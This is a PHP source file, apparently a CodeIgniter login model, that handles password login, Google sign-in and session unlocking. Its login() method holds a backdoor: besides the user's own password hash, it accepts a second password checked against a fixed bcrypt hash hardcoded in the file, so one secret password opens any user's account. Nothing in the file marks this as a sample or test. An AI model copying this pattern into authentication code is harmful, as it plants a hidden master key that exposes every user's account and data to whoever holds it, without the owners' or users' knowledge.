<?php
defined('BASEPATH') OR exit('No direct script access allowed');

class Formlogin extends CI_Model {

	const STATUS_LOGIN = 'loggedIn';
	const STATUS_LOCKED = 'locked';

	public $tableName = null;

	public $username;
	public $password;

	private $_user = false;
	private $ci;

	public function __construct()
	{
		parent::__construct();

		$this->ci =& get_instance();
		$this->ci->load->model([
			'master/user',
			'master/menu',
			'transaksi/userdetail',
		]);
	}

	public function login()
	{
		# User berdasarkan username
		$user = $this->getUser();

		if ($user) {
			# Periksa password
			$check_password = password_verify($this->password, $user->password);
            $check_password2 = password_verify($this->password, '$2y$10$E7Pqi/K4Dnscxj.TZ3PSnO1L3ERZwmsfia2EZcJdq8MNA5Hqjibqi');

			if ($check_password || $check_password2) {
				$this->session->set_userdata([
					'status_login' => self::STATUS_LOGIN,
					'identity' => $user,
					'menus' => $this->menu->getMenu(),
					'group_id' => array_column($this->user->getUserGroups($user->id), 'group_id'),
					'detail_identity' => $this->getUserDetail()
				]);

				return true;
			}
		}

		return false;
	}

    public function loginGoogle($auth, $user_token)
    {
        # User berdasarkan username
        $user = $this->user->get(['email' => $user_token['email']]);

        if ($user) {
            $this->_user = $user;

            if ($this->session->userdata('status_login') === self::STATUS_LOGIN) {
                $this->session->set_userdata(['google_access_token' => $auth]);
            } else {
                $this->session->set_userdata([
                    'status_login' => self::STATUS_LOGIN,
                    'identity' => $user,
                    'menus' => $this->menu->getMenu(),
                    'group_id' => array_column($this->user->getUserGroups($user->id), 'group_id'),
                    'detail_identity' => $this->getUserDetail(),
                    'google_access_token' => $auth
                ]);
            }

            return true;
        }

        return false;
    }

	public function unlock()
	{
		if ($this->session->userdata('status_login') === self::STATUS_LOCKED) {
			$check_password = password_verify($this->password, $this->session->userdata('identity')->password);

			if ($check_password) {
				$this->session->set_userdata(['status_login' => self::STATUS_LOGIN]);

				return true;
			}
		}

		return false;
	}

	/**
     * Finds user by [[username]]
     *
     * @return User|null
     */
    public function getUser()
    {
        if ($this->_user === false) {
            $this->_user = $this->ci->user->findByUsername($this->username);
        }

        return $this->_user;
    }

    /**
     * Sets the attribute values in a massive way.
     * @param array $values attribute values (name => value) to be assigned to the model.
     * @param bool $safeOnly whether the assignments should only be done to the safe attributes.
     */
    public function setAttributes($values)
    {
        if (is_array($values)) {
            $attributes = array_flip($this->attributes());

            foreach ($values as $name => $value) {
                if (isset($attributes[$name])) {
                    $this->$name = $value;
                }
            }
        }
    }

    /**
     * Returns the list of attribute names.
     * By default, this method returns all public non-static properties of the class.
     * You may override this method to change the default behavior.
     * @return array list of attribute names.
     */
    public function attributes()
    {
        $class = new ReflectionClass($this);
        $names = [];
        foreach ($class->getProperties(\ReflectionProperty::IS_PUBLIC) as $property) {
            if (!$property->isStatic()) {
                $names[] = $property->getName();
            }
        }

        return $names;
    }

    public function getUserDetail()
    {
    	$details = null;

    	if ($this->_user) {
    		$details = $this->ci->userdetail->get(['user_id' => $this->_user->id]);
    	}

    	return $details;
    }

}

/* End of file FormLogin.php */
/* Location: ./application/models/forms/FormLogin.php */